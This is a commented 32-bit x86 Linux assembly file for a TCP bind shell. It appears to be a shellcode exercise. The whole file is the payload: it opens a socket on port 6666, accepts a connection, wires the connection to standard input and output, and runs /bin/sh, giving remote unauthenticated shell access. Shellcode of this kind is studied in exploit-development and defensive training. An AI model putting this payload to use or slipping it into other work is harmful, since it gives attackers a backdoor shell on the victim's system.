;tcp bind shell
global _start
section .text
_start:
	
	;socketcall syscall 102
	;int socket(int domain, int type, int protocol);
	xor eax, eax		; zero out EAX
	xor ebx, ebx		; zero out EBX
	mov bl, 1		; put socket = 1 in EBX
	xor ecx, ecx		; zero out ECX
	push eax		; put 0x00 on the stack
	push byte 6		; put protocol = 6 on the stack
	push byte 1		; put type = 1 on the stack
	push byte 2		; put domain = 2 on the stack
	mov ecx, esp		; put address of all arguments in ECX
	mov al, 102		; put socketcall = 102 in EAX
	int 0x80		; execute syscal socketcall

	xor edi, edi		; zero out EDI
	mov edi, eax		; save socketfd in EDI

	;int bind(int sockfd, const struct sockaddr *addr,socklen_t addrlen);
	xor eax, eax		; zero out EAX
	inc bl			; increment EBX with 1
	xor ecx, ecx		; zero out ECX
	push eax		; put 0x00 on the stack
	push 0x0a1a		; put portnr. 6666 on the stack
	push word 2		; put sa_family = 2 on the stack
	xor esi, esi		; zero out ESI
	mov esi, esp		; put address of all arguments in ESI
	push eax		; put 0x00 on the stack
	push byte 16		; put addrslen = 16 on the stack
	push esi		; put address of stuct sockaddr in ESI
	push edi		; put address of scoketfd in EDI
	mov ecx, esp		; put address of all arguments in ECX
	mov al, 102		; put socketcall = 102 in EAX
	int 0x80		; execute syscall socketcall

	;int listen(int sockfd, int backlog);
	xor eax, eax		; zero out EAX
	add bl, 2		; add 2 to EBX
	push eax		; put 0x00 on the stack
	push byte 1		; put backlog = 1 on the stack
	push edi		; put address of socketfd on the stack
	xor ecx, ecx		; zero out ECX
	mov ecx, esp		; put address of all arguments in ECX
	mov al, 102		; put socketcall = 102 in EAX
	int 0x80		; execute syscall socketcall

	;int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
	xor eax, eax		; zero out EAX
	inc bl			; increment EBX with 1
	push eax		; put 0x00 on the stack
	push eax		; put 0x00 on the stack
	push edi		; put address of the socketfd on the stack
	mov ecx, esp		; put address of all arguments in ECX
	mov al, 102		; put socketcall = 102 in EAX
	int 0x80		; execute syscall socketcall

	xor ebx, ebx		; zero out EBX
	mov ebx, eax		; put socketfd in EBX
	xor ecx, ecx		; zero out ECX
	mov cl, 2		; put 2 int ECX
	xor eax, eax		; zero out EAX

loop:
	;int dup2(int oldfd, int newfd); STDIN - STOUT - STERR
	mov al, 63		; put dup2 = 63 int EAX
	int 0x80		; exexute syscall dup2
	dec cl			; decrement ECX with 1
	jns loop		; jump back to label loop if sign flag is not set
	

	;execve syscall 11
	xor eax, eax		; zero out EAX

	;int execve(const char *filename, char *const argv[],char *const envp[]);
	push eax		; put 0x00 terminator on the stack
	push 0x68732f2f		; put hs// on the stack
	push 0x6e69622f		; put nib// on the stack
	mov ebx, esp		; put address of the filename in EBX
	push eax		; put 0x00 on the stack
	push ebx		; put address of the filename on the stack
	mov ecx, esp		; put address of argv[] in ECX
	push eax		; put 0x00 on the stack
	mov edx, esp		; put address of the envp[] in EDX
	mov al, 11		; put execve = 11 in EAX
	int 0x80		; execute syscall execve

